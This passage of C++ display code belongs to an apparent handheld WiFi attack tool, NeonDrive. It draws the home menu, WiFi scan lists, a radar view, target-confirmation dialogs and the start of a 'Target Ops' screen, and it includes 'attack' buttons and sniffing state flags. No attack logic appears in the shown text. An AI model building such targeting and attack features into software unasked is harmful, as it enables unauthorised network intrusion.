  homeBtns[8] = {pad + (topBtnW + gapH) * 2, topBtnY, topBtnW, gridBtnH, "GPS"};

  // Main grid (2 rows x 3 cols): Logs / Target / Recon / Config / Net Scan / PACKETLAB.
  const char* gridLabels[6] = {"Logs", "Target", "Recon", "Config", "Net Scan", "Packet Lab"};
  int idx = 2;
  for (int r = 0; r < 2; ++r) {
    const int y = (r == 0) ? row1Y : row2Y;
    for (int c = 0; c < HOME_BTN_COLS; ++c) {
      const int x = pad + c * (gridBtnW + gapH);
      homeBtns[idx++] = {x, y, gridBtnW, gridBtnH, gridLabels[(r * HOME_BTN_COLS) + c]};
    }
  }
}

static void drawHomeTargetsPromptOverlay();
static void drawHomeReconnectPromptOverlay();

static void layoutActionDockBox() {
  const int w = tft.width();
  const int h = tft.height();
  ActionDockBoxW = HypercubeWidget::REGION_W;
  ActionDockBoxH = HypercubeWidget::REGION_H;
  ActionDockBoxX = w - HypercubeWidget::REGION_PAD - ActionDockBoxW;
  ActionDockBoxY = HypercubeWidget::REGION_PAD;
  ActionDockBoxX = clampi(ActionDockBoxX, ActionDock_CLEARANCE_PX, max(ActionDock_CLEARANCE_PX, w - ActionDock_CLEARANCE_PX - ActionDockBoxW));
  ActionDockBoxY = clampi(ActionDockBoxY, 0, max(0, h - ActionDockBoxH));
}

static void drawHomeHypercubeFrame() {
  layoutActionDockBox();
  const int x = ActionDockBoxX - 8;
  const int y = ActionDockBoxY - 8;
  const int w = ActionDockBoxW + 16;
  const int h = ActionDockBoxH + 34;
  tft.drawRoundRect(x, y, w, h, 6, TFT_CYAN);
  tft.drawRoundRect(x + 2, y + 2, w - 4, h - 4, 5, 0x2104);
  tft.setTextDatum(TC_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("HYPERCUBE", x + (w / 2), y + h - 14);
}

static void drawCyberBackdrop() {
  const int w = tft.width();
  const int h = tft.height();

  // Dark cyberpunk base across full screen.
  tft.fillRect(0, 0, w, h, TFT_BLACK);

  // Subtle neon grid across full screen.
  for (int y = 0; y < h; y += 16) {
    tft.drawFastHLine(0, y, w, 0x1082); // dim blue-grey
  }
  for (int x = 0; x < w; x += 20) {
    tft.drawFastVLine(x, 0, h, 0x0841);
  }

  // Diagonal accent bands.
  for (int i = -40; i < w; i += 30) {
    tft.drawLine(i, h - 1, i + 50, 0, 0x3006); // dim magenta tone
  }
  // Backdrop is full-screen, so redraw title text on top for every screen.
  drawHeaderTitleOverlay();
}

static void drawHome() {
  tft.fillScreen(TFT_BLACK);
  drawHeader(ND_HOME_HEADER);
  drawUniversalBackground();
  drawHomeHypercubeFrame();

  layoutHome();
  // Draw cyber-styled home buttons with icon lane + label lane.
  for (int i = 0; i < HOME_BTN_COUNT; ++i) {
    if (homeBtns[i].label == nullptr || homeBtns[i].label[0] == '\0') continue;
    drawHomeButton(homeBtns[i], homeBtnBorderColor(i), TFT_WHITE);
  }

  tft.setTextDatum(BC_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  if (tft.height() <= 180) {
    tft.drawString("BTN1=Next  BTN2=Select", tft.width() / 2, tft.height() - 6);
  } else {
    tft.drawString("NeonDrive: CYD UI + WiFi scan + target ops", tft.width() / 2, tft.height() - 6);
  }
  drawBorder();
  if (homeReconnectPromptActive) drawHomeReconnectPromptOverlay();
  if (homeTargetsPromptActive) drawHomeTargetsPromptOverlay();
#if ND_HW_KEYBOARD
  drawFocusRing();
#endif
}

static void drawHomeReconnectPromptOverlay() {
  const int w = tft.width();
  const int h = tft.height();
  const int boxW = w - 40;
  const int boxH = 140;
  const int boxX = 20;
  const int boxY = (h - boxH) / 2;

  tft.drawRoundRect(boxX, boxY, boxW, boxH, 12, TFT_GREEN);
  tft.fillRoundRect(boxX + 2, boxY + 2, boxW - 4, boxH - 4, 12, TFT_BLACK);

  tft.setTextDatum(TL_DATUM);
  applyFontMd();
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("Reconnect WiFi?", boxX + 12, boxY + 12);

  applyFontSm();
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  String ssid = cfg.wifi_ssid.isEmpty() ? "(none)" : cfg.wifi_ssid;
  if (ssid.length() > 24) ssid = ssid.substring(0, 21) + "...";
  tft.drawString("Last: " + ssid, boxX + 12, boxY + 52);
  tft.drawString("Connect now?", boxX + 12, boxY + 66);

  btnHomePromptNo  = {boxX + 12, boxY + boxH - 52, 110, 40, "No"};
  btnHomePromptYes = {boxX + boxW - 122, boxY + boxH - 52, 110, 40, "Yes"};
  drawButton(btnHomePromptNo, TFT_MAROON, TFT_CYAN, TFT_WHITE);
  drawButton(btnHomePromptYes, TFT_DARKGREEN, TFT_MAGENTA, TFT_WHITE);

  drawBorder();
}



static void drawHomeTargetsPromptOverlay() {
  const int w = tft.width();
  const int h = tft.height();

  // Modal box
  const int boxW = w - 40;
  const int boxH = 140;
  const int boxX = 20;
  const int boxY = (h - boxH) / 2;

  tft.drawRoundRect(boxX, boxY, boxW, boxH, 12, TFT_CYAN);
  tft.fillRoundRect(boxX + 2, boxY + 2, boxW - 4, boxH - 4, 12, TFT_BLACK);

  tft.setTextDatum(TL_DATUM);
  applyFontMd();
  tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
  tft.drawString("No scan data", boxX + 12, boxY + 12);

  applyFontSm();
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Run a WiFi scan now?", boxX + 12, boxY + 52);

  btnHomePromptNo  = {boxX + 12, boxY + boxH - 52, 110, 40, "No"};
  btnHomePromptYes = {boxX + boxW - 122, boxY + boxH - 52, 110, 40, "Yes"};

  drawButton(btnHomePromptNo, TFT_MAROON, TFT_CYAN, TFT_WHITE);
  drawButton(btnHomePromptYes, TFT_DARKGREEN, TFT_MAGENTA, TFT_WHITE);

  tft.setTextDatum(TL_DATUM);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("Targets needs scan results", boxX + 12, boxY + boxH - 64);

  drawBorder();
}

static void drawPlaceholder(const char* title, const char* msg) {
  tft.fillScreen(TFT_BLACK);
  drawHeader(title);
  drawUniversalBackground();

  tft.setTextDatum(MC_DATUM);
  applyFontMd();
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.drawString(msg, tft.width() / 2, tft.height() / 2);

  btnBack = {10, tft.height() - 50, 120, 40, "Back"};
  drawButton(btnBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);

  drawBorder();
}


static void drawWifiRow(int idx, int y, bool selected) {
  // Keep row width fixed to the list container width to prevent per-row overdraw.
  const int listX = wifiListDrawX;
  const int listW = max(120, wifiListDrawW);
  const uint16_t bg = selected ? TFT_DARKGREEN : TFT_BLACK;
  const uint16_t fg = selected ? TFT_BLACK : TFT_WHITE;

  tft.fillRect(listX, y, listW, wifiRowH - 2, bg);
  tft.drawRect(listX, y, listW, wifiRowH - 2, TFT_DARKGREY);

  if (idx < 0 || idx >= apCount) return;

  const ApRecord& a = aps[idx];

  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(fg, bg);

  const int line1Y = y + ((wifiRowH >= 32) ? 4 : 2);
  const int line2Y = y + ((wifiRowH >= 32) ? 18 : 13);

  // Line 1: SSID + RSSI
  char line1[64];
  snprintf(line1, sizeof(line1), "%s  (%ddBm)", a.ssid.c_str(), a.rssi);
  tft.drawString(line1, listX + 4, line1Y);

  // Line 2: CH + SEC + BSSID
  char line2[80];
  snprintf(line2, sizeof(line2), "CH %d  %s  %s", a.channel, authToStr(a.auth), a.bssid.c_str());
  tft.drawString(line2, listX + 4, line2Y);
}


static void drawWifiConfirmOverlay() {
  const int w = tft.width();
  const int h = tft.height();
  const bool compact = (h <= 180);

  // Dim background
  tft.fillRect(0, 34, w, h - 34, TFT_BLACK);

  // Modal box
  const int boxW = ((w - 40) * 9) / 10;
  const int boxH = compact ? 98 : (140 * 9) / 10;
  const int boxX = (w - boxW) / 2;
  int boxY = (h - boxH) / 2;
  const int minBoxY = uiHeaderBandH() + 8;
  if (boxY < minBoxY) boxY = minBoxY;
  const int maxBoxY = h - boxH - 4;
  if (boxY > maxBoxY) boxY = maxBoxY;

  tft.drawRoundRect(boxX, boxY, boxW, boxH, 12, TFT_MAGENTA);
  tft.fillRoundRect(boxX + 2, boxY + 2, boxW - 4, boxH - 4, 12, TFT_BLACK);

  tft.setTextDatum(TL_DATUM);
  if (compact) { applyFontSm(); } else { applyFontMd(); }
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("Set Target?", boxX + 12, boxY + 12);

  applyFontSm();
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  
  // Display pending target details
  tft.drawString(String("SSID: ") + pendingTarget.ssid, boxX + 12, boxY + (compact ? 30 : 44));
  char line2[96];
  snprintf(line2, sizeof(line2), "CH: %d  RSSI: %ddBm  SEC: %s", pendingTarget.channel, pendingTarget.rssi, authToStr(pendingTarget.auth));
  tft.drawString(line2, boxX + 12, boxY + (compact ? 44 : 60));

  // Buttons
  const int btnW = compact ? 84 : 110;
  const int btnH = compact ? 28 : 40;
  btnWifiNo  = {boxX + 12, boxY + boxH - (btnH + 10), btnW, btnH, "No"};
  btnWifiYes = {boxX + boxW - (btnW + 12), boxY + boxH - (btnH + 10), btnW, btnH, "Yes"};

  drawButton(btnWifiNo, TFT_MAROON, TFT_CYAN, TFT_WHITE);
  drawButton(btnWifiYes, TFT_DARKGREEN, TFT_MAGENTA, TFT_WHITE);

  // Footer hint
  tft.setTextDatum(BC_DATUM);
  tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
  tft.drawString("tap Yes to open Target Ops", w / 2, boxY + boxH - 3);

  drawBorder();
}

static void drawConfirmTarget() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("Confirm Target");
  drawUniversalBackground();
  
  const int w = tft.width();
  const int h = tft.height();
  const bool compact = (h <= 180);

  // Modal box
  const int boxW = ((w - 40) * 9) / 10;
  const int boxH = compact ? 98 : (140 * 9) / 10;
  const int boxX = (w - boxW) / 2;
  int boxY = (h - boxH) / 2;
  const int minBoxY = uiHeaderBandH() + 8;
  if (boxY < minBoxY) boxY = minBoxY;
  const int maxBoxY = h - boxH - 4;
  if (boxY > maxBoxY) boxY = maxBoxY;

  tft.drawRoundRect(boxX, boxY, boxW, boxH, 12, TFT_MAGENTA);
  tft.fillRoundRect(boxX + 2, boxY + 2, boxW - 4, boxH - 4, 12, TFT_BLACK);

  tft.setTextDatum(TL_DATUM);
  if (compact) { applyFontSm(); } else { applyFontMd(); }
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("Proceed to Target?", boxX + 12, boxY + 12);

  applyFontSm();
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  if (hasTarget) {
    tft.drawString(String("SSID: ") + target.ssid, boxX + 12, boxY + (compact ? 30 : 44));
    char line2[96];
    snprintf(line2, sizeof(line2), "CH: %d  RSSI: %ddBm  SEC: %s", target.channel, target.rssi, authToStr(target.auth));
    tft.drawString(line2, boxX + 12, boxY + (compact ? 44 : 60));
  } else {
    tft.drawString("No target selected.", boxX + 12, boxY + (compact ? 36 : 50));
  }

  // Buttons
  const int btnW = compact ? 84 : 110;
  const int btnH = compact ? 28 : 40;
  btnWifiNo  = {boxX + 12, boxY + boxH - (btnH + 10), btnW, btnH, "No"};
  btnWifiYes = {boxX + boxW - (btnW + 12), boxY + boxH - (btnH + 10), btnW, btnH, "Yes"};

  drawButton(btnWifiNo, TFT_MAROON, TFT_CYAN, TFT_WHITE);
  drawButton(btnWifiYes, TFT_DARKGREEN, TFT_MAGENTA, TFT_WHITE);

  drawBorder();
}

// ── Cardputer WiFi Scanner (240×135) ─────────────────────────────────────────
// Clean list-only layout: no radar, no side panel.
// 7 rows × 12px = 84px list + 11px col-header = 95px content (fills 115-20=95px ✓)
// Bottom bar: [Back][Scan][↑][↓]  — Enter/→ sets target and goes to CONFIRM_TARGET.
// Touch: row taps select; Back/Scan/↑/↓ buttons work as normal.
// Keyboard: ↑↓ scroll list, Enter/→ go to target, 'S' scan, Backspace/OPT back.
#if defined(NEONDRIVE_TARGET_M5CARDPUTER)
static void drawWifiScanCardputer() {
  tft.fillScreen(TFT_BLACK);
  drawUniversalBackground();

  // Header: compact title with scan state inline
  String hdr = "WiFi Scan";
  if (wifiIsScanning) { hdr += " [...]"; }
  drawHeader(hdr.c_str());

  const int W    = tft.width();     // 240
  const int H    = tft.height();    // 135
  const int lm   = g_ui->safe_margin;               // 4
  const int cY   = g_ui->top_gap + g_ui->header_h;  // 20  (content start)
  const int barY = H - g_ui->bottom_bar_h;           // 115 (bottom bar start)
  const int btnH = g_ui->bottom_bar_h - 2;           // 18

  // ── Bottom bar: [Back][Scan][↑][↓] ────────────────────────────────────────
  const int bGap = 4;
  const int bW   = (W - 2*lm - 4*bGap) / 5;
  btnWifiBack     = {lm + (bW+bGap)*0, barY, bW, btnH, "B Back"};
  btnWifiScan     = {lm + (bW+bGap)*1, barY, bW, btnH, "S Scan"};
  btnWifiConnect  = {lm + (bW+bGap)*2, barY, bW, btnH, "C Conn"};
  btnWifiTargetGo = {lm + (bW+bGap)*3, barY, bW, btnH, "T Tgt"};
  btnWifiRescan   = {lm + (bW+bGap)*4, barY, bW, btnH, "A Atk"};
  btnWifiUp       = {0,0,0,0,""};
  btnWifiDown     = {0,0,0,0,""};
  drawButton(btnWifiBack, TFT_NAVY,     TFT_WHITE, TFT_WHITE);
  drawButton(btnWifiScan, TFT_DARKCYAN, TFT_WHITE, TFT_WHITE);
  drawButton(btnWifiConnect, 0x2100, TFT_YELLOW, TFT_WHITE);
  drawButton(btnWifiTargetGo, 0x7800, TFT_MAGENTA, TFT_WHITE);
  drawButton(btnWifiRescan, 0x4000, TFT_RED, TFT_WHITE);

  // ── Column headers ─────────────────────────────────────────────────────────
  // Layout (size-1 GLCD: 6px/char wide, 8px tall):
  //  x=4  : ">" selection indicator
  //  x=11 : SSID (clipped, 120px wide = ~20 chars)
  //  x=133: CH (2 chars right-pad)
  //  x=149: dBm (4 chars right-pad, "-100")
  //  x=177: Auth (4 chars, "WPA2"/"OPEN"/"WPA3")
  //  x=229: primed dot (W-lm-3 = 233)
  const int colSSIDX = lm + 9;   // 13
  const int colCHX   = 133;
  const int colDBX   = 149;
  const int colAuX   = 177;
  constexpr uint16_t kHdrBg = 0x1082;  // dark blue-grey

  tft.fillRect(lm, cY, W - 2*lm, 10, kHdrBg);
  applyFontSm();
  tft.setTextDatum(TL_DATUM);
  tft.setTextColor(TFT_GREEN, kHdrBg);
  tft.drawString("SSID",  colSSIDX, cY + 1);
  tft.drawString("CH",    colCHX,   cY + 1);
  tft.drawString("dBm",   colDBX,   cY + 1);
  tft.drawString("Auth",  colAuX,   cY + 1);
  // Count indicator right-aligned in header row
  if (apCount > 0) {
    char cnt[10];
    snprintf(cnt, sizeof(cnt), "%d/%d", (apSelected >= 0 ? apSelected + 1 : 0), apCount);
    tft.setTextDatum(TR_DATUM);
    tft.setTextColor(TFT_CYAN, kHdrBg);
    tft.drawString(cnt, W - lm - 1, cY + 1);
    tft.setTextDatum(TL_DATUM);
  }
  tft.drawLine(lm, cY + 10, W - lm, cY + 10, TFT_DARKGREY);

  // ── Network list ───────────────────────────────────────────────────────────
  const int listY = cY + 11;          // 31
  const int rowH  = g_ui->row_h;      // 12
  const int nRows = min(7, (barY - listY) / rowH);  // 7

  // Clamp apSelected to valid range
  if (apCount == 0) { apSelected = -1; }
  else if (apSelected < 0) { apSelected = 0; }
  else if (apSelected >= apCount) { apSelected = apCount - 1; }

  // Keep scroll window centred on selected row
  if (apSelected >= 0) {
    if (apSelected < apScroll)          apScroll = apSelected;
    if (apSelected >= apScroll + nRows) apScroll = apSelected - nRows + 1;
  }
  if (apScroll < 0) apScroll = 0;

  // Expose geometry for touch handler
  wifiListTopY    = listY;
  wifiListBottomY = listY + nRows * rowH;
  wifiListDrawX   = lm;
  wifiListDrawW   = W - 2*lm;
  wifiRowH        = rowH;

  // Reset all row/check buttons (touch handler iterates up to 4)
  for (int r = 0; r < 4; r++) { btnWifiRows[r] = {0,0,0,0,""}; btnWifiChecks[r] = {0,0,0,0,""}; }

  for (int r = 0; r < nRows; r++) {
    const int idx = apScroll + r;
    const int y   = listY + r * rowH;
    const int rh  = rowH - 1;

    if (r < 4) btnWifiRows[r] = {lm, y, W - 2*lm, rh, "AP"};

    const bool     sel  = (idx == apSelected);
    const uint16_t bg   = sel ? 0x0340 : TFT_BLACK;    // dark-green tint or black
    const uint16_t fgSS = sel ? TFT_WHITE  : TFT_CYAN;  // SSID colour
    const uint16_t fgNm = sel ? TFT_YELLOW : TFT_WHITE; // numeric columns

    tft.fillRect(lm, y, W - 2*lm, rh, bg);
    tft.drawRect(lm, y, W - 2*lm, rh, sel ? TFT_MAGENTA : TFT_DARKGREY);

    if (idx < apCount) {
      const ApRecord& a = aps[idx];
      applyFontSm();
      tft.setTextDatum(TL_DATUM);

      // Selection arrow
      tft.setTextColor(sel ? TFT_YELLOW : bg, bg);
      tft.drawString(">", lm + 1, y + 2);

      // SSID — clipped to colCHX-colSSIDX-4 = 120px (~20 chars)
      const String ssid = a.ssid.isEmpty() ? String("(hidden)") : a.ssid;
      drawTextClipped(ssid, colSSIDX, y + 2, colCHX - colSSIDX - 4, fgSS, bg, true);

      // Channel (2 chars)
      char buf[8];
      tft.setTextColor(fgNm, bg);
      snprintf(buf, sizeof(buf), "%2d", a.channel);
      tft.drawString(buf, colCHX, y + 2);

      // RSSI (4 chars, e.g. " -70")
      snprintf(buf, sizeof(buf), "%4d", a.rssi);
      tft.drawString(buf, colDBX, y + 2);

      // Auth (4 chars truncated)
      snprintf(buf, sizeof(buf), "%.4s", authToStr(a.auth));
      tft.setTextColor(sel ? TFT_YELLOW : TFT_WHITE, bg);
      tft.drawString(buf, colAuX, y + 2);

      // Primed target dot (magenta filled circle at row right edge)
      if (idx < MAX_APS && wifiPrimedByIndex[idx]) {
        tft.fillCircle(W - lm - 4, y + rowH / 2, 2, TFT_MAGENTA);
      }
    }
  }

  tft.fillRect(lm, listY + (nRows * rowH) - 10, W - 2*lm, 10, TFT_BLACK);
  tft.setTextDatum(TL_DATUM);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.drawString("S scan  C connect  T target  A attack  B back", lm + 1, listY + (nRows * rowH) - 9);

  // Empty-state message
  if (apCount == 0 && !wifiIsScanning) {
    applyFontMd();
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.setTextDatum(TC_DATUM);
    tft.drawString("NO NETWORKS - PRESS S TO SCAN", W / 2, listY + (nRows * rowH / 2));
    applyFontSm();
    tft.setTextDatum(TL_DATUM);
  }

#if !ND_HW_KEYBOARD
  if (wifiConnectShowPasswordModal) drawWifiPasswordModal();
#endif
  drawBorder();
}
#endif  // NEONDRIVE_TARGET_M5CARDPUTER

static void drawWifiScan() {
#if defined(NEONDRIVE_TARGET_M5CARDPUTER)
  drawWifiScanCardputer();
  return;
#endif
  tft.fillScreen(TFT_BLACK);
  drawHeader("WiFi Scanner");
  drawUniversalBackground();

  const int w = tft.width();
  const int h = tft.height();
  const bool compact = (h <= 180);
#if defined(NEONDRIVE_TARGET_CYD35)
  const bool cyd35Layout = true;
#else
  const bool cyd35Layout = false;
#endif
#if defined(NEONDRIVE_TARGET_CYD24)
  const bool cyd24Layout = true;
#else
  const bool cyd24Layout = false;
#endif
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  const int reserveLeft = (UI_HYPERCUB_RESERVE_W > 0) ? UI_HYPERCUB_RESERVE_X : w;
  const int rightLimit = max(content.x + 120, min(content.x + content.w, reserveLeft - 6));
  // Keep radar narrower so WiFi rows can use more width on the right panel.
  const int leftColW = cyd35Layout ? clampi((w * 96) / 480, 86, 120)
                                    : (cyd24Layout ? clampi((w * 72) / 320, 56, 74)
                                    : clampi((w * 220) / 1280, compact ? 56 : 48, 220));
  const int panelGap = (cyd35Layout || cyd24Layout) ? 6 : (compact ? 6 : 10);
  const int leftX = content.x;
  const int leftW = min(leftColW, rightLimit - leftX - 40);
  const int rightX = leftX + leftW + panelGap;
  const int rightW = max(100, rightLimit - rightX);

  const int bottomBtnGap = (cyd35Layout || cyd24Layout) ? 6 : (compact ? 4 : 8);
  const int bottomBtnW = max(50, (rightLimit - content.x - (bottomBtnGap * 3)) / 4);
  btnWifiBack = {content.x, bottom.y, bottomBtnW, UI_BUTTON_H, "Back"};
  btnWifiScan = {content.x + (bottomBtnW + bottomBtnGap), bottom.y, bottomBtnW, UI_BUTTON_H, "Scan"};
  btnWifiConnect = {content.x + (bottomBtnW + bottomBtnGap) * 2, bottom.y, bottomBtnW, UI_BUTTON_H, "Connect"};
  btnWifiTargetGo = {content.x + (bottomBtnW + bottomBtnGap) * 3, bottom.y, bottomBtnW, UI_BUTTON_H, "Target"};
  btnWifiRescan = {0, 0, 0, 0, ""};
  drawButton(btnWifiBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);
  drawButton(btnWifiScan, TFT_DARKCYAN, TFT_WHITE, TFT_WHITE);
  drawButton(btnWifiConnect, TFT_DARKCYAN, TFT_WHITE, TFT_WHITE);
  drawButton(btnWifiTargetGo, 0x7800, TFT_MAGENTA, TFT_WHITE);
  tft.setTextDatum(TL_DATUM);

  const int topY = content.y;
  // Scale radar panel from Tab5 baseline (250px @ 720h ~= 34.7% height).
  const int radarH = cyd35Layout ? 110
                   : (cyd24Layout ? 84
                   : clampi((h * 250) / 720, compact ? 56 : 72, 250));
  wifiRadarX = leftX;
  wifiRadarY = topY;
  wifiRadarW = leftW;
  wifiRadarH = radarH;
  tft.drawRoundRect(wifiRadarX, wifiRadarY, wifiRadarW, wifiRadarH, 8, TFT_GREEN);
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.drawString("RADAR", wifiRadarX + 6, wifiRadarY + 4);

  const int statsY = wifiRadarY + wifiRadarH + panelGap;
  const int statsH = max(40, bottom.y - statsY - panelGap);
  tft.drawRoundRect(leftX, statsY, leftW, statsH, 8, TFT_GREEN);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("NETWORKS: " + String(apCount), leftX + 6, statsY + 8);
  tft.drawString("TARGETS: " + String(wifiPrimedCount), leftX + 6, statsY + 24);
  tft.drawString(wifiIsScanning ? "SCAN: RUNNING" : "SCAN: IDLE", leftX + 6, statsY + 40);

  // Keep selected-network card tall enough that details and Connect never overlap.
  const int selectedH = cyd35Layout ? 72
                    : (cyd24Layout ? 44
                    : (compact ? 72 : 148));
  tft.drawRoundRect(rightX, topY, rightW, selectedH, 8, TFT_GREEN);
  applyFontSm();
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.drawString("SELECTED NETWORK", rightX + 6, topY + 6);
  String ssid = "(none)";
  if (apSelected >= 0 && apSelected < apCount) ssid = aps[apSelected].ssid.isEmpty() ? String("(hidden)") : aps[apSelected].ssid;
  applyFontMd();
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  drawTextClipped(ssid, rightX + 6, topY + (compact ? 22 : 30), rightW - 12, TFT_CYAN, TFT_BLACK, true);
  applyFontSm();
  const int detailLine1Y = topY + (cyd35Layout ? 34 : (cyd24Layout ? 24 : (compact ? 40 : 66)));
  const int detailLine2Y = topY + (cyd35Layout ? 50 : (cyd24Layout ? 34 : (compact ? 52 : 84)));
  if (apSelected >= 0 && apSelected < apCount) {
    const ApRecord& a = aps[apSelected];
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    drawTextClipped("BSSID: " + a.bssid, rightX + 6, detailLine1Y, rightW - 12, TFT_WHITE, TFT_BLACK, false);
    drawTextClipped("CH " + String(a.channel) + "  " + String(a.rssi) + "dBm  " + authToStr(a.auth),
                    rightX + 6, detailLine2Y, rightW - 12, TFT_WHITE, TFT_BLACK, true);
  }
  const int tableY = topY + selectedH + panelGap;
  const int scrollBtn = compact ? 18 : 24;
  wifiListTopY = tableY + ((cyd35Layout || cyd24Layout) ? 14 : 20);
  wifiListBottomY = bottom.y - panelGap;
  wifiListDrawX = rightX;
  wifiListDrawW = rightW;
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.drawString("TARGET  SSID / BSSID", rightX + 2, tableY + 4);
  tft.setTextDatum(TL_DATUM);

  const int maxRows = (cyd35Layout || cyd24Layout)
                    ? 4
                    : min(4, max(1, (wifiListBottomY - wifiListTopY) / (compact ? 18 : 36)));
  wifiRowH = (cyd35Layout || cyd24Layout)
           ? max(g_ui->row_h + (cyd24Layout ? 2 : 8), (wifiListBottomY - wifiListTopY) / 4)
           : max(18, (wifiListBottomY - wifiListTopY) / maxRows);
  for (int r = 0; r < 4; r++) {
    btnWifiRows[r] = {0,0,0,0,""};
    btnWifiChecks[r] = {0,0,0,0,""};
  }
  for (int r = 0; r < maxRows; r++) {
    const int idx = apScroll + r;
    const int y = wifiListTopY + (r * wifiRowH);
    const int rowH = wifiRowH - 2;
    btnWifiRows[r] = {rightX, y, rightW, rowH, "AP"};
    const int checkSize = cyd24Layout ? 10 : (compact ? 12 : 20);
    btnWifiChecks[r] = {rightX + 3, y + 3, checkSize, checkSize, ""};
    const bool sel = (idx == apSelected);
    tft.fillRect(rightX, y, rightW, rowH, sel ? TFT_DARKGREEN : TFT_BLACK);
    tft.drawRect(rightX, y, rightW, rowH, sel ? TFT_MAGENTA : TFT_DARKGREY);
    if (idx < apCount) {
      tft.drawRect(btnWifiChecks[r].x, btnWifiChecks[r].y, btnWifiChecks[r].w, btnWifiChecks[r].h, TFT_MAGENTA);
      if (wifiPrimedByIndex[idx]) tft.fillRect(btnWifiChecks[r].x + 2, btnWifiChecks[r].y + 2, btnWifiChecks[r].w - 4, btnWifiChecks[r].h - 4, TFT_MAGENTA);
      const ApRecord& a = aps[idx];
      tft.setTextColor(sel ? TFT_WHITE : TFT_CYAN, sel ? TFT_DARKGREEN : TFT_BLACK);
      const String rowText = cyd24Layout
        ? ((a.ssid.isEmpty() ? String("(hidden)") : a.ssid) + "  CH" + String(a.channel) + "  " + String(a.rssi) + "dBm")
        : ((a.ssid.isEmpty() ? String("(hidden)") : a.ssid) + "  " + a.bssid + "  CH" + String(a.channel) + "  " + String(a.rssi) + "dBm");
      const int rowTextX = btnWifiChecks[r].x + btnWifiChecks[r].w + 6;
      const int rowTextW = (rightX + rightW - rowTextX) - 6;
      drawTextClipped(rowText, rowTextX, y + (compact ? 2 : 8), rowTextW, sel ? TFT_WHITE : TFT_CYAN, sel ? TFT_DARKGREEN : TFT_BLACK, true);
    }
  }

  btnWifiUp = {rightX + rightW - scrollBtn, wifiListTopY - scrollBtn - 2, scrollBtn, scrollBtn, "^"};
  btnWifiDown = {rightX + rightW - scrollBtn, wifiListBottomY - scrollBtn, scrollBtn, scrollBtn, "v"};
  drawButton(btnWifiUp, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
  drawButton(btnWifiDown, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);

  if (wifiConnectShowPasswordModal) drawWifiPasswordModal();

  uiLogLayout("drawWifiScan", content, bottom);
  drawBorder();
}

static void drawWifiRadarSweep() {
  if (screen != ScreenId::WIFI_SCAN) return;
  if (wifiRadarW < 40 || wifiRadarH < 40) return;
  const int cx = wifiRadarX + (wifiRadarW / 2);
  const int cy = wifiRadarY + (wifiRadarH / 2) + 8;
  const int r = min(wifiRadarW, wifiRadarH) / 2 - 16;
  if (r <= 8) return;

  tft.fillRect(wifiRadarX + 1, wifiRadarY + 16, wifiRadarW - 2, wifiRadarH - 18, TFT_BLACK);
  tft.drawCircle(cx, cy, r, TFT_GREEN);
  tft.drawCircle(cx, cy, (r * 2) / 3, 0x03E0);
  tft.drawCircle(cx, cy, r / 3, 0x03E0);
  tft.drawLine(cx - r, cy, cx + r, cy, 0x03E0);
  tft.drawLine(cx, cy - r, cx, cy + r, 0x03E0);
  for (int i = 0; i < min(apCount, 10); i++) {
    const ApRecord& a = aps[i];
    const float ar = (wifiRadarSweepDeg + (i * 37)) * 0.0174533f;
    const int rr = map(constrain(-a.rssi, 35, 95), 35, 95, r / 5, r);
    const int px = cx + (int)(cosf(ar) * rr);
    const int py = cy + (int)(sinf(ar) * rr);
    tft.fillCircle(px, py, 3, (i == apSelected) ? TFT_MAGENTA : TFT_CYAN);
  }
  const float sr = wifiRadarSweepDeg * 0.0174533f;
  const int sx = cx + (int)(cosf(sr) * r);
  const int sy = cy + (int)(sinf(sr) * r);
  tft.drawLine(cx, cy, sx, sy, TFT_GREENYELLOW);
}

static void drawTargetDetails() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("Target Ops");
  drawUniversalBackground();

  const int w = tft.width();
  const int h = tft.height();
  const bool compact = (h <= 180);
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  const int rightEdge = w - 5;
  const int bottomEdge = h - 5;
  const bool targetOpsRunning = sniffActive || (autoMode != AutoMode::NONE);
  const int safeRight = min(content.x + content.w, uiActionDockSafeLeft() - 1);

  // Option B: left action rail + right target/hud stack.
  const int railX = content.x;
  const int railY = content.y + 2;
  const int railW = compact ? 72 : 78;
  const int backBtnH = UI_BUTTON_H;
  const int backBtnY = bottomEdge - backBtnH + 1;
  const int railBottom = backBtnY - 6;  // Reserve corner lane for Back button.
  const int railH = max(100, railBottom - railY);
  const int railPad = 4;
  const int railGap = compact ? 6 : 8;
  int railBtnH = compact ? 22 : 26;
  if ((railBtnH * 4) + (railGap * 3) > railH - (railPad * 2)) {
    railBtnH = max(18, (railH - (railPad * 2) - (railGap * 3)) / 4);
  }
